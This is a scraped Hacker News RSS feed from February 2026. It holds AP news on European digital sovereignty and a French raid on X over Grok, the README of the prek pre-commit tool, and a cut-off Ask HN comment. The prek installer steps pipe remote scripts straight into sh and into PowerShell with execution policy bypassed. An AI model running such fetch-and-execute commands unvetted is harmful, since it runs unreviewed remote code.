<p>Other incidents have added to the movement. There’s a growing sense that repeated EU efforts to rein in tech giants such as Google with blockbuster <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/google-european-union-antitrust-digital-ca4a31c3f7cf7d33ea9c4748bc3ac459">antitrust fines</a></span> and sweeping <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/digital-markets-act-european-union-rules-apple-5162872791b985e794df9b3a7b46aed1">digital rule books</a></span> haven’t done much to curb their dominance.</p><p>Billionaire Elon Musk is also a factor. Officials worry about relying on his Starlink satellite internet system for communications in Ukraine. </p><p>Washington and Brussels wrangled for years over data transfer agreements, triggered by former National Security Agency contractor Edward Snowden’s revelations of U.S. cyber-snooping. </p><p>With online services now mainly hosted in the cloud through data centers, Europeans fear that their data is vulnerable. </p><p>U.S. cloud providers have responded by setting up so-called “sovereign cloud” operations, with data centers located in European countries, owned by European entities and with physical and remote access only for staff who are European Union residents.</p>
    
<p>The idea is that “only Europeans can take decisions so that they can’t be coerced by the U.S.,” Reiners said. </p><p>The German state of Schleswig-Holstein last year migrated 44,000 employee inboxes from Microsoft to an open source email program. It also switched from Microsoft’s SharePoint file sharing system to Nextcloud, an open source platform, and is even considering replacing Windows with Linux and telephones and videoconferencing with open source systems. </p><p>“We want to become independent of large tech companies and ensure digital sovereignty,” Digitalization Minister Dirk Schrödter said in an October <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://www.schleswig-holstein.de/DE/landesregierung/ministerien-behoerden/I/Presse/PI/2025/cds/251006_cds_ox" target="_blank" rel="noopener">announcement</a></span>. </p><p>The French city of Lyon said last year that it’s deploying free office software to replace Microsoft. Denmark’s government and the cities of Copenhagen and Aarhus have also been trying out open-source software.</p><p>“We must never make ourselves so dependent on so few that we can no longer act freely,” Digital Minister Caroline Stage Olsen wrote on LinkedIn last year. “Too much public digital infrastructure is currently tied up with very few foreign suppliers.”</p><p>The Austrian military said it has also switched to LibreOffice, a software package with word processor, spreadsheet and presentation programs that mirrors Microsoft 365’s Word, Excel and PowerPoint. </p><p>The Document Foundation, a nonprofit based in Germany that’s behind LibreOffice, said the military’s switch “reflects a growing demand for independence from single vendors.” Reports also said the military was concerned that Microsoft was moving file storage online to the cloud — the standard version of LibreOffice is not cloud-based. </p><p>Some Italian cities and regions adopted the software years ago, said Italo Vignoli, a spokesman for The Document Foundation. Back then, the appeal was not needing to pay for software licenses. Now, it’s the main reason is to avoid being locked into a proprietary system. </p><p>“At first, it was: we will save money and by the way, we will get freedom,” Vignoli said. “Today it is: we will be free and by the way, we will also save some money.”</p><p>___</p><p>Associated Press writer Molly Quell in The Hague, Netherlands contributed to this report. </p><p>___</p><p>This version corrects the contribution line to Molly Quell instead of Molly Hague. </p>
                                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Prek: A better, faster, drop-in pre-commit replacement, engineered in Rust (249 pts)]]></title>
            <link>https://github.com/j178/prek</link>
            <guid>46873138</guid>
            <pubDate>Tue, 03 Feb 2026 16:29:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/j178/prek">https://github.com/j178/prek</a>, See on <a href="https://news.ycombinator.com/item?id=46873138">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">

<p dir="auto"><a href="https://pre-commit.com/" rel="nofollow">pre-commit</a> is a framework to run hooks written in many languages, and it manages the
language toolchain and dependencies for running the hooks.</p>
<p dir="auto"><em>prek</em> is a reimagined version of pre-commit, built in Rust.
It is designed to be a faster, dependency-free and drop-in alternative for it,
while also providing some additional long-requested features.</p>

<div dir="auto"><p dir="auto">Note</p><p dir="auto">Although prek is pretty new, it’s already powering real‑world projects like <a href="https://github.com/python/cpython">CPython</a>, <a href="https://github.com/apache/airflow">Apache Airflow</a>, <a href="https://github.com/fastapi/fastapi">FastAPI</a>, and more projects are picking it up—see <a href="#who-is-using-prek">Who is using prek?</a>. If you’re looking for an alternative to <code>pre-commit</code>, please give it a try—we’d love your feedback!</p>
<p dir="auto">Please note that some languages are not yet supported for full drop‑in parity with <code>pre-commit</code>. See <a href="https://prek.j178.dev/languages/" rel="nofollow">Language Support</a> for current status.</p>
</div>

<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>🚀 A single binary with no dependencies, does not require Python or any other runtime.</li>
<li>⚡ <a href="https://prek.j178.dev/benchmark/" rel="nofollow">Faster</a> than <code>pre-commit</code> and more efficient in disk space usage.</li>
<li>🔄 Fully compatible with the original pre-commit configurations and hooks.</li>
<li>🏗️ Built-in support for monorepos (i.e. <a href="https://prek.j178.dev/workspace/" rel="nofollow">workspace mode</a>).</li>
<li>🐍 Integration with <a href="https://github.com/astral-sh/uv"><code>uv</code></a> for managing Python virtual environments and dependencies.</li>
<li>🛠️ Improved toolchain installations for Python, Node.js, Bun, Go, Rust and Ruby, shared between hooks.</li>
<li>📦 <a href="https://prek.j178.dev/builtin/" rel="nofollow">Built-in</a> Rust-native implementation of some common hooks.</li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Table of contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#installation">Installation</a></li>
<li><a href="#quick-start">Quick start</a></li>
<li><a href="#why-prek">Why prek?</a></li>
<li><a href="#who-is-using-prek">Who is using prek?</a></li>
<li><a href="#acknowledgements">Acknowledgements</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<details>
<summary>Standalone installer</summary>
<p dir="auto">prek provides a standalone installer script to download and install the tool,</p>
<p dir="auto">On Linux and macOS:</p>

<div dir="auto" data-snippet-clipboard-copy-content="curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.sh | sh"><pre>curl --proto <span><span>'</span>=https<span>'</span></span> --tlsv1.2 -LsSf https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.sh <span>|</span> sh</pre></div>

<p dir="auto">On Windows:</p>

<div dir="auto" data-snippet-clipboard-copy-content="powershell -ExecutionPolicy ByPass -c &quot;irm https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.ps1 | iex&quot;"><pre>powershell <span>-</span>ExecutionPolicy ByPass <span>-</span>c <span><span>"</span>irm https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.ps1 | iex<span>"</span></span></pre></div>

</details>
<details>
<summary>PyPI</summary>

<p dir="auto">prek is published as Python binary wheel to PyPI, you can install it using <code>pip</code>, <code>uv</code> (recommended), or <code>pipx</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Using uv (recommended)
uv tool install prek

# Using uvx (install and run in one command)
uvx prek

# Adding prek to the project dev-dependencies
uv add --dev prek

# Using pip
pip install prek

# Using pipx
pipx install prek"><pre><span><span>#</span> Using uv (recommended)</span>
uv tool install prek

<span><span>#</span> Using uvx (install and run in one command)</span>
uvx prek

<span><span>#</span> Adding prek to the project dev-dependencies</span>
uv add --dev prek

<span><span>#</span> Using pip</span>
pip install prek

<span><span>#</span> Using pipx</span>
pipx install prek</pre></div>

</details>
<details>
<summary>Homebrew</summary>



</details>
<details>
<summary>mise</summary>

<p dir="auto">To use prek with <a href="https://mise.jdx.dev/" rel="nofollow">mise</a> (<a href="https://github.com/jdx/mise/releases/tag/v2025.8.11">v2025.8.11</a> or later):</p>


</details>
<details>
<summary>Cargo binstall</summary>

<p dir="auto">Install pre-compiled binaries from GitHub using <a href="https://github.com/cargo-bins/cargo-binstall">cargo-binstall</a>:</p>


</details>
<details>
<summary>Cargo</summary>

<p dir="auto">Build from source using Cargo (Rust 1.89+ is required):</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo install --locked prek"><pre>cargo install --locked prek</pre></div>

</details>
<details>
<summary>npmjs</summary>

<p dir="auto">prek is published as a <a href="https://www.npmjs.com/package/@j178/prek" rel="nofollow">Node.js package</a>
and can be installed with any npm-compatible package manager:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# As a dev dependency
npm add -D @j178/prek
pnpm add -D @j178/prek
bun add -D @j178/prek

# Or install globally
npm install -g @j178/prek
pnpm add -g @j178/prek
bun install -g @j178/prek

# Or run directly without installing
npx @j178/prek --version
bunx @j178/prek --version"><pre><span><span>#</span> As a dev dependency</span>
npm add -D @j178/prek
pnpm add -D @j178/prek
bun add -D @j178/prek

<span><span>#</span> Or install globally</span>
npm install -g @j178/prek
pnpm add -g @j178/prek
bun install -g @j178/prek

<span><span>#</span> Or run directly without installing</span>
npx @j178/prek --version
bunx @j178/prek --version</pre></div>

</details>
<details>
<summary>Nix</summary>

<p dir="auto">prek is available via <a href="https://search.nixos.org/packages?channel=unstable&amp;show=prek&amp;query=prek" rel="nofollow">Nixpkgs</a>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Choose what's appropriate for your use case.
# One-off in a shell:
nix-shell -p prek

# NixOS or non-NixOS without flakes:
nix-env -iA nixos.prek

# Non-NixOS with flakes:
nix profile install nixpkgs#prek"><pre><span><span>#</span> Choose what's appropriate for your use case.</span>
<span><span>#</span> One-off in a shell:</span>
nix-shell -p prek

<span><span>#</span> NixOS or non-NixOS without flakes:</span>
nix-env -iA nixos.prek

<span><span>#</span> Non-NixOS with flakes:</span>
nix profile install nixpkgs#prek</pre></div>

</details>
<details>
<summary>Conda</summary>

<p dir="auto">prek is available as <code>prek</code> via <a href="https://anaconda.org/conda-forge/prek" rel="nofollow">conda-forge</a>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="conda install conda-forge::prek"><pre>conda install conda-forge::prek</pre></div>

</details>
<details>
<summary>Scoop (Windows)</summary>

<p dir="auto">prek is available via <a href="https://scoop.sh/#/apps?q=prek" rel="nofollow">Scoop</a>.</p>


</details>
<details>
<summary>MacPorts</summary>

<p dir="auto">prek is available via <a href="https://ports.macports.org/port/prek/" rel="nofollow">MacPorts</a>.</p>


</details>
<details>
<summary>GitHub Releases</summary>

<p dir="auto">Pre-built binaries are available for download from the <a href="https://github.com/j178/prek/releases">GitHub releases</a> page.</p>

</details>
<details>
<summary>GitHub Actions</summary>

<p dir="auto">prek can be used in GitHub Actions via the <a href="https://github.com/j178/prek-action">j178/prek-action</a> repository.</p>
<p dir="auto">Example workflow:</p>
<div dir="auto" data-snippet-clipboard-copy-content="name: Prek checks
on: [push, pull_request]

jobs:
  prek:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: j178/prek-action@v1"><pre><span>name</span>: <span>Prek checks</span>
<span>on</span>: <span>[push, pull_request]</span>

<span>jobs</span>:
  <span>prek</span>:
    <span>runs-on</span>: <span>ubuntu-latest</span>
    <span>steps</span>:
      - <span>uses</span>: <span>actions/checkout@v6</span>
      - <span>uses</span>: <span>j178/prek-action@v1</span></pre></div>
<p dir="auto">This action installs prek and runs <code>prek run --all-files</code> on your repository.</p>
<p dir="auto">prek is also available via <a href="https://github.com/taiki-e/install-action"><code>taiki-e/install-action</code></a> for installing various tools.</p>

</details>

<p dir="auto">If installed via the standalone installer, prek can update itself to the latest version:</p>


<p dir="auto"><h2 tabindex="-1" dir="auto">Quick start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick start" href="#quick-start"></a></p>
<ul dir="auto">
<li><strong>I already use pre-commit:</strong> follow the short migration checklist in the <a href="https://prek.j178.dev/quickstart/#already-using-pre-commit" rel="nofollow">quickstart guide</a> to swap in <code>prek</code> safely.</li>
<li><strong>I'm new to pre-commit-style tools:</strong> learn the basics—creating a config, running hooks, and installing git hooks—in the <a href="https://prek.j178.dev/quickstart/#new-to-pre-commit-style-workflows" rel="nofollow">beginner quickstart walkthrough</a>.</li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Why prek?</h2><a id="user-content-why-prek" aria-label="Permalink: Why prek?" href="#why-prek"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">prek is faster</h3><a id="user-content-prek-is-faster" aria-label="Permalink: prek is faster" href="#prek-is-faster"></a></p>
<ul dir="auto">
<li>It is <a href="https://prek.j178.dev/benchmark/" rel="nofollow">multiple times faster</a> than <code>pre-commit</code> and takes up half the disk space.</li>
<li>It redesigned how hook environments and toolchains are managed, they are all shared between hooks, which reduces the disk space usage and speeds up the installation process.</li>
<li>Repositories are cloned in parallel, and hooks are installed in parallel if their dependencies are disjoint.</li>
<li>Hooks can run in parallel by priority (hooks with the same <a href="https://prek.j178.dev/configuration/#priority" rel="nofollow"><code>priority</code></a> may run concurrently), reducing end-to-end runtime.</li>
<li>It uses <a href="https://github.com/astral-sh/uv"><code>uv</code></a> for creating Python virtualenvs and installing dependencies, which is known for its speed and efficiency.</li>
<li>It implements some common hooks in Rust, <a href="https://prek.j178.dev/builtin/" rel="nofollow">built in prek</a>, which are faster than their Python counterparts.</li>
<li>It supports <code>repo: builtin</code> for offline, zero-setup hooks, which is not available in <code>pre-commit</code>.</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">prek provides a better user experience</h3><a id="user-content-prek-provides-a-better-user-experience" aria-label="Permalink: prek provides a better user experience" href="#prek-provides-a-better-user-experience"></a></p>
<ul dir="auto">
<li>No need to install Python or any other runtime, just download a single binary.</li>
<li>No hassle with your Python version or virtual environments, prek automatically installs the required Python version and creates a virtual environment for you.</li>
<li>Built-in support for <a href="https://prek.j178.dev/workspace/" rel="nofollow">workspaces</a> (or monorepos), each subproject can have its own <code>.pre-commit-config.yaml</code> file.</li>
<li><a href="https://prek.j178.dev/cli/#prek-run" rel="nofollow"><code>prek run</code></a> has some nifty improvements over <code>pre-commit run</code>, such as:
<ul dir="auto">
<li><code>prek run --directory &lt;dir&gt;</code> runs hooks for files in the specified directory, no need to use <code>git ls-files -- &lt;dir&gt; | xargs pre-commit run --files</code> anymore.</li>
<li><code>prek run --last-commit</code> runs hooks for files changed in the last commit.</li>
<li><code>prek run [HOOK] [HOOK]</code> selects and runs multiple hooks.</li>
</ul>
</li>
<li><a href="https://prek.j178.dev/cli/#prek-list" rel="nofollow"><code>prek list</code></a> command lists all available hooks, their ids, and descriptions, providing a better overview of the configured hooks.</li>
<li><a href="https://prek.j178.dev/cli/#prek-auto-update" rel="nofollow"><code>prek auto-update</code></a> supports <code>--cooldown-days</code> to mitigate open source supply chain attacks.</li>
<li>prek provides shell completions for <code>prek run &lt;hook_id&gt;</code> command, making it easier to run specific hooks without remembering their ids.</li>
</ul>
<p dir="auto">For more detailed improvements prek offers, take a look at <a href="https://prek.j178.dev/diff/" rel="nofollow">Difference from pre-commit</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Who is using prek?</h2><a id="user-content-who-is-using-prek" aria-label="Permalink: Who is using prek?" href="#who-is-using-prek"></a></p>
<p dir="auto">prek is pretty new, but it is already being used or recommend by some projects and organizations:</p>
<ul dir="auto">
<li><a href="https://github.com/apache/airflow/issues/44995" data-hovercard-type="issue" data-hovercard-url="/apache/airflow/issues/44995/hovercard">apache/airflow</a></li>
<li><a href="https://github.com/python/cpython/issues/143148" data-hovercard-type="issue" data-hovercard-url="/python/cpython/issues/143148/hovercard">python/cpython</a></li>
<li><a href="https://github.com/pdm-project/pdm/pull/3593" data-hovercard-type="pull_request" data-hovercard-url="/pdm-project/pdm/pull/3593/hovercard">pdm-project/pdm</a></li>
<li><a href="https://github.com/fastapi/fastapi/pull/14572" data-hovercard-type="pull_request" data-hovercard-url="/fastapi/fastapi/pull/14572/hovercard">fastapi/fastapi</a></li>
<li><a href="https://github.com/fastapi/typer/pull/1453" data-hovercard-type="pull_request" data-hovercard-url="/fastapi/typer/pull/1453/hovercard">fastapi/typer</a></li>
<li><a href="https://github.com/fastapi/asyncer/pull/437" data-hovercard-type="pull_request" data-hovercard-url="/fastapi/asyncer/pull/437/hovercard">fastapi/asyncer</a></li>
<li><a href="https://github.com/astral-sh/ruff/pull/22505" data-hovercard-type="pull_request" data-hovercard-url="/astral-sh/ruff/pull/22505/hovercard">astral-sh/ruff</a></li>
<li><a href="https://github.com/astral-sh/ty/pull/2469" data-hovercard-type="pull_request" data-hovercard-url="/astral-sh/ty/pull/2469/hovercard">astral-sh/ty</a></li>
<li><a href="https://github.com/openclaw/openclaw/pull/1720" data-hovercard-type="pull_request" data-hovercard-url="/openclaw/openclaw/pull/1720/hovercard">openclaw/openclaw</a></li>
<li><a href="https://github.com/home-assistant/core/pull/160427" data-hovercard-type="pull_request" data-hovercard-url="/home-assistant/core/pull/160427/hovercard">home-assistant/core</a></li>
<li><a href="https://github.com/DetachHead/basedpyright/pull/1413" data-hovercard-type="pull_request" data-hovercard-url="/DetachHead/basedpyright/pull/1413/hovercard">DetachHead/basedpyright</a></li>
<li><a href="https://github.com/OpenLineage/OpenLineage/pull/3965" data-hovercard-type="pull_request" data-hovercard-url="/OpenLineage/OpenLineage/pull/3965/hovercard">OpenLineage/OpenLineage</a></li>
<li><a href="https://github.com/authlib/authlib/pull/804" data-hovercard-type="pull_request" data-hovercard-url="/authlib/authlib/pull/804/hovercard">authlib/authlib</a></li>
<li><a href="https://github.com/django/djangoproject.com/pull/2252" data-hovercard-type="pull_request" data-hovercard-url="/django/djangoproject.com/pull/2252/hovercard">django/djangoproject.com</a></li>
<li><a href="https://github.com/Future-House/paper-qa/pull/1098" data-hovercard-type="pull_request" data-hovercard-url="/Future-House/paper-qa/pull/1098/hovercard">Future-House/paper-qa</a></li>
<li><a href="https://github.com/requests-cache/requests-cache/pull/1116" data-hovercard-type="pull_request" data-hovercard-url="/requests-cache/requests-cache/pull/1116/hovercard">requests-cache/requests-cache</a></li>
<li><a href="https://github.com/Goldziher/kreuzberg/pull/142" data-hovercard-type="pull_request" data-hovercard-url="/kreuzberg-dev/kreuzberg/pull/142/hovercard">Goldziher/kreuzberg</a></li>
<li><a href="https://github.com/python-attrs/attrs/commit/c95b177682e76a63478d29d040f9cb36a8d31915">python-attrs/attrs</a></li>
<li><a href="https://github.com/jlowin/fastmcp/pull/2309" data-hovercard-type="pull_request" data-hovercard-url="/jlowin/fastmcp/pull/2309/hovercard">jlowin/fastmcp</a></li>
<li><a href="https://github.com/apache/iceberg-python/pull/2533" data-hovercard-type="pull_request" data-hovercard-url="/apache/iceberg-python/pull/2533/hovercard">apache/iceberg-python</a></li>
<li><a href="https://github.com/apache/lucene/pull/15629" data-hovercard-type="pull_request" data-hovercard-url="/apache/lucene/pull/15629/hovercard">apache/lucene</a></li>
<li><a href="https://github.com/jcrist/msgspec/pull/918" data-hovercard-type="pull_request" data-hovercard-url="/jcrist/msgspec/pull/918/hovercard">jcrist/msgspec</a></li>
<li><a href="https://github.com/python-humanize/humanize/pull/276" data-hovercard-type="pull_request" data-hovercard-url="/python-humanize/humanize/pull/276/hovercard">python-humanize/humanize</a></li>
<li><a href="https://github.com/MoonshotAI/kimi-cli/pull/535" data-hovercard-type="pull_request" data-hovercard-url="/MoonshotAI/kimi-cli/pull/535/hovercard">MoonshotAI/kimi-cli</a></li>
<li><a href="https://github.com/simple-icons/simple-icons/pull/14245" data-hovercard-type="pull_request" data-hovercard-url="/simple-icons/simple-icons/pull/14245/hovercard">simple-icons/simple-icons</a></li>
<li><a href="https://github.com/ast-grep/ast-grep.github.io/commit/e30818144b2967a7f9172c8cf2f4596bba219bf5">ast-grep/ast-grep</a></li>
<li><a href="https://github.com/commitizen-tools/commitizen">commitizen-tools/commitizen</a></li>
<li><a href="https://github.com/cocoindex-io/cocoindex/pull/1564" data-hovercard-type="pull_request" data-hovercard-url="/cocoindex-io/cocoindex/pull/1564/hovercard">cocoindex-io/cocoindex</a></li>
<li><a href="https://github.com/cachix/devenv/pull/2304" data-hovercard-type="pull_request" data-hovercard-url="/cachix/devenv/pull/2304/hovercard">cachix/devenv</a></li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Acknowledgements</h2><a id="user-content-acknowledgements" aria-label="Permalink: Acknowledgements" href="#acknowledgements"></a></p>
<p dir="auto">This project is heavily inspired by the original <a href="https://pre-commit.com/" rel="nofollow">pre-commit</a> tool, and it wouldn't be possible without the hard work
of the maintainers and contributors of that project.</p>
<p dir="auto">And a special thanks to the <a href="https://github.com/astral-sh">Astral</a> team for their remarkable projects, particularly <a href="https://github.com/astral-sh/uv">uv</a>,
from which I've learned a lot on how to write efficient and idiomatic Rust code.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[X offices raided in France (288 pts)]]></title>
            <link>https://apnews.com/article/france-x-investigation-seach-elon-musk-1116be84d84201011219086ecfd4e0bc</link>
            <guid>46872894</guid>
            <pubDate>Tue, 03 Feb 2026 16:14:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://apnews.com/article/france-x-investigation-seach-elon-musk-1116be84d84201011219086ecfd4e0bc">https://apnews.com/article/france-x-investigation-seach-elon-musk-1116be84d84201011219086ecfd4e0bc</a>, See on <a href="https://news.ycombinator.com/item?id=46872894">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                                        <p>PARIS (AP) — French prosecutors raided the offices of social media platform X on Tuesday as part of a preliminary investigation into allegations including spreading child sexual abuse images and deepfakes. They have also summoned billionaire owner Elon Musk for questioning.</p><p>X and Musk’s artificial intelligence company xAI also face intensifying scrutiny from Britain’s data privacy regulator, which opened formal investigations into how they handled personal data when they developed and deployed Musk’s artificial intelligence chatbot Grok. </p><p><span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/grok-ai-elon-musk-xai-f3f8195a17698aefc517e43da973f2ea">Grok</a></span>, which was built by xAI and is available through X, sparked <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/grok-elon-musk-deepfake-x-social-media-2bfa06805b323b1d7e5ea7bb01c9da77">global outrage</a></span> last month after it pumped out a torrent of sexualized nonconsensual deepfake images in response to requests from X users. </p><p>The French investigation was opened in January last year by the prosecutors’ cybercrime unit, the Paris prosecutors’ office said in a statement. It’s looking into alleged “complicity” in possessing and spreading pornographic images of minors, sexually explicit deepfakes, denial of crimes against humanity and manipulation of an automated data processing system as part of an organized group, among other charges.</p>
    
<p>Prosecutors asked Musk and former CEO Linda Yaccarino to attend “voluntary interviews” on April 20. Employees of X have also been summoned that same week to be heard as witnesses, the statement said. Yaccarino <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/x-ceo-linda-yaccarino-elon-musk-grok-39ba18ec4851445967ce114a0a452928">was CEO</a></span> from May 2023 until July 2025.</p>



<p>A spokesperson for X did not respond to multiple requests for comment. X’s lawyer in France, Kami Haeri, told The Associated Press: ″We are not making any comment at this stage.”</p>
    
    
    
<p>In a message posted on X, the Paris prosecutors’ office announced the ongoing searches at the company’s offices in France and said it was leaving the platform while calling on followers to join it on other social media.</p><p>“At this stage, the conduct of the investigation is based on a constructive approach, with the aim of ultimately ensuring that the X platform complies with French law, as it operates on the national territory,” the prosecutors’ statement said.</p>
    
<p>European Union police agency Europol “is supporting the French authorities in this,” Europol spokesperson Jan Op Gen Oorth told the AP, without elaborating.</p><p>French authorities opened their investigation after reports from a French lawmaker alleging that biased algorithms on X likely distorted the functioning of an automated data processing system.</p><p>It expanded after Grok generated posts that allegedly denied the Holocaust, a crime in France, and spread sexually explicit deepfakes, the statement said. </p><p>Grok wrote in a widely shared post in French that gas chambers at the <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/hub/auschwitz">Auschwitz-Birkenau</a></span> death camp were designed for “disinfection with Zyklon B against typhus” rather than for mass murder — language long associated with Holocaust denial. </p><p>In later posts on X, the chatbot reversed itself and acknowledged that its earlier reply was wrong, saying it had been deleted and pointed to historical evidence that Zyklon B was used to kill more than 1 million people in Auschwitz gas chambers.</p>
    
<p>The chatbot also appeared to praise Adolf Hitler last year, in comments that X took down after <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/elon-musk-chatbot-ai-grok-d745a7e3d0a7339a1159dc6c42475e29">complaints</a></span>.</p><p>In Britain, the Information Commissioner’s Office said it’s looking into whether X and xAI followed the law when processing personal data and whether Grok had any measures in place to prevent its use to generate “harmful manipulated images.”</p><p>“The reports about Grok raise deeply troubling questions about how people’s personal data has been used to generate intimate or sexualised images without their knowledge or consent, and whether the necessary safeguards were put in place to prevent this,” said William Malcolm, an executive director at the watchdog.</p><p>He didn’t specify what the penalty would be if the probe found the companies didn’t comply with data protection laws.</p><p>A separate investigation into Grok launched last month by the U.K. media regulator, Ofcom, is ongoing. </p><p>Ofcom said Tuesday it’s still gathering evidence and warned the probe could take months. </p>
    
<p>X has also been under pressure from the EU. The 27-nation bloc’s executive arm opened an <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/elon-musk-x-grok-ai-deepfakes-sexual-c1a3039e5aaeb4dd517d995b8b301537">investigation</a></span> last month after Grok spewed nonconsensual sexualized deepfake images on the platform. </p><p>Brussels has already hit X with a <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/x-elon-musk-twitter-european-union-regulations-0a135601e050518d5aa0a0155f973177">120-million euro</a></span> (then-$140 million) fine for shortcomings under the bloc’s sweeping digital regulations, including blue checkmarks that <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/x-twitter-european-union-musk-dsa-645e9a224cd82ed1bc3cde9156215293">broke the rules</a></span> on “deceptive design practices” that risked exposing users to scams and manipulation.</p><p>On Monday, Musk ’s space exploration and rocket business, SpaceX, <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/spacex-xai-musk-space-2079f03fa888652b7fe836afe8b670a1">announced</a></span> that it acquired xAI in a deal that will also combine Grok, X and his satellite communication company Starlink.</p><p>___</p><p>Associated Press writers Nicolas Vaux-Montagny in Lyon, France, Mike Corder in The Hague, Netherlands, Sylvia Hui and Kelvin Chan in London contributed to this report. </p>
                                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Qwen3-Coder-Next (663 pts)]]></title>
            <link>https://qwen.ai/blog?id=qwen3-coder-next</link>
            <guid>46872706</guid>
            <pubDate>Tue, 03 Feb 2026 16:01:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://qwen.ai/blog?id=qwen3-coder-next">https://qwen.ai/blog?id=qwen3-coder-next</a>, See on <a href="https://news.ycombinator.com/item?id=46872706">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[New York Wants to Ctrl+Alt+Delete Your 3D Printer (437 pts)]]></title>
            <link>https://blog.adafruit.com/2026/02/03/new-york-wants-to-ctrlaltdelete-your-3d-printer/</link>
            <guid>46872540</guid>
            <pubDate>Tue, 03 Feb 2026 15:51:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.adafruit.com/2026/02/03/new-york-wants-to-ctrlaltdelete-your-3d-printer/">https://blog.adafruit.com/2026/02/03/new-york-wants-to-ctrlaltdelete-your-3d-printer/</a>, See on <a href="https://news.ycombinator.com/item?id=46872540">Hacker News</a></p>
Couldn't get https://blog.adafruit.com/2026/02/03/new-york-wants-to-ctrlaltdelete-your-3d-printer/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Anthropic is Down (143 pts)]]></title>
            <link>https://updog.ai/status/anthropic</link>
            <guid>46872481</guid>
            <pubDate>Tue, 03 Feb 2026 15:48:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://updog.ai/status/anthropic">https://updog.ai/status/anthropic</a>, See on <a href="https://news.ycombinator.com/item?id=46872481">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Is there anyone here who still uses slide rules? (114 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=46871179</link>
            <guid>46871179</guid>
            <pubDate>Tue, 03 Feb 2026 14:10:21 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=46871179">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><tbody><tr id="46872256"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872256" href="https://news.ycombinator.com/vote?id=46872256&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I designed and 3D-printed my own slide rule to help me play Balatro!</p><p>Balatro is a roguelike survival game where you need to multiply "chips" and "mult" together to meet a requirement each round. You get three chances to draft enough resources to survive. I designed my own slide rule to help with the mental multiplication - most of the fun of the game comes from the mechanics being slightly obscured from the player.</p><p>Since I designed this slide rule myself, I was able to make a couple unconventional design choices that fit my needs. For instance, mine has three octaves so it can represent numbers within the ones, thousands, or millions' range, for example; no need to track arbitrary powers of ten. Since it's a rotary rule, it wraps around. Eg. 353×24 shows on the device as 8.47, so you can think of it as 8.47 thousand, for example.</p><p>Holding a physical object in my hands while playing helps more than I thought it would. Should I take a card that increases chips by 600 or increases mult by 1.3×? Do I need to take a card to clear the blind in the short term, or do I have enough resources to draft a slower card that will scale better over time? Even just looking at how densely packed the marks are on the "Chips" side vs the "Mult" side of the device gives a visceral physical sense of what my build needs to focus on.</p><p>Pictures and .STL: <a href="https://www.printables.com/model/1026662-jimbos-rotary-slide-rule-calculator-for-balatro" rel="nofollow">https://www.printables.com/model/1026662-jimbos-rotary-slide...</a></p><p>Github repository: <a href="https://github.com/gcr/balatro-slide-rule" rel="nofollow">https://github.com/gcr/balatro-slide-rule</a></p><p>The actual plotting code used Marimo notebooks, which host a python in your browser via WASM. Take a look here: <a href="https://marimo.app/l/4i15d7" rel="nofollow">https://marimo.app/l/4i15d7</a></p><p>I entered it in Printables’ 